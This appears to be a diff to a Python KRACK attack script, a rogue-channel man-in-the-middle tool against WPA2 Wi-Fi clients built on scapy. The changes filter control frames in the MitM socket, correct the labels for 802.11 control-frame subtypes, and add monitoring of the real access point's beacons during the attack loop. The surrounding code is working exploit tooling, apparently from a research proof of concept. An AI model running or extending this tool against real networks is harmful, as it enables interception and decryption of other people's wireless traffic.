@@ -15,7 +15,6 @@ from wpaspy import Ctrl
 #
 # - Test that we indeed have two different Msg3's, and not just retransmissions
 #
-# - Do not forward control frames?
 # - Delete created *sta virtual interfaces
 # - Detect usage off all-zero key by decrypting frames (so we can miss some frames safely)
 # - ACK frames of the real AP sent to ALL clients (currently we only call those of the targeted client)
@@ -84,6 +83,11 @@ class MitmSocket(L2Socket):
 		p = L2Socket.recv(self)
 		if p == None or not Dot11 in p: return None
 		if self.pcap: self.pcap.write(p)
+
+		# Don't care about control frames
+		if p.type == 1:
+			log(ALL, "Ignoring control frame: %s" % dot11_to_str(p))
+			return None
 
 		# Hack: ignore frames that we just injected and are echoed back by the kernel
 		if p[Dot11].FCfield & 0x20 != 0:
@@ -155,7 +159,8 @@ def dot11_to_str(p):
 		if Dot11AssoResp in p:  return "AssoResp(seq=%d, status=%d)" % (dot11_get_seqnum(p), p[Dot11AssoResp].status)
 		if Dot11Disas in p:     return "Disas(seq=%d)" % dot11_get_seqnum(p)
 	elif p.type == 1:
-		if p.subtype == 11:     return "BlockAck"
+		if p.subtype ==  9:     return "BlockAck"
+		if p.subtype == 11:     return "RTS"
 		if p.subtype == 13:     return "Ack"
 	elif p.type == 2:
 		if Dot11WEP in p:         return "EncryptedData(seq=%d, IV=%d)" % (dot11_get_seqnum(p), dot11_get_iv(p))
@@ -202,7 +207,6 @@ def set_mac_address(iface, macaddr):
 	subprocess.check_output(["ifconfig", iface, "up"])
 
 def set_monitor_ack_address(iface, macaddr):
-	# TODO: Continuously monitor for beacons to see whether we remain on the proper channel
 	"""Add a virtual STA interface for ACK generation. This assumes nothing takes control of this
        interface, meaning it remains on the current channel."""
 	sta_iface = iface + "sta"
@@ -482,6 +486,10 @@ class KRAckAttack():
 
 		# 2. Handle frames sent BY the real AP
 		elif p.addr2 == self.apmac:
+			# Track time of last beacon we received. Verify channel to assure it's not the rogue AP.
+			if Dot11Beacon in p and get_tlv_value(p, IEEE_TLV_TYPE_CHANNEL) == self.netconfig.channel:
+				self.last_beacon = time.time()
+
 			# Decide whether we will (eventually) forward it
 			might_forward = p.addr1 in self.clients and self.clients[p.addr1].should_forward(p)
 
@@ -663,6 +671,7 @@ class KRAckAttack():
 		#else:                      self.queue_disas(self.clientmac) # TODO XXX FIXME TODO: Only do this if no traffic on rouge channel
 
 		# Continue attack by monitoring both channels and performing needed actions
+		self.last_beacon = time.time()
 		nextbeacon = time.time() + 0.01
 		while True:
 			sel = select.select([self.sock_rogue, self.sock_real], [], [], 0.01)
@@ -670,9 +679,15 @@ class KRAckAttack():
 			if self.sock_rogue in sel[0]: self.handle_rx_roguechan()
 			while len(self.disas_queue) > 0 and self.disas_queue[0][0] <= time.time():
 				self.send_disas(self.disas_queue.pop()[1])
+
 			if nextbeacon <= time.time():
 				#self.send_csa_beacon() # FIXME
 				nextbeacon += 0.01
+
+			print self.last_beacon + 2, time.time()
+			if self.last_beacon + 2 < time.time():
+				log(WARNING, "Didn't receive beacon from target network for two seconds")
+				self.last_beacon = time.time()
 
 	def stop(self):
 		log(STATUS, "Closing hostapd and cleaning up ...")
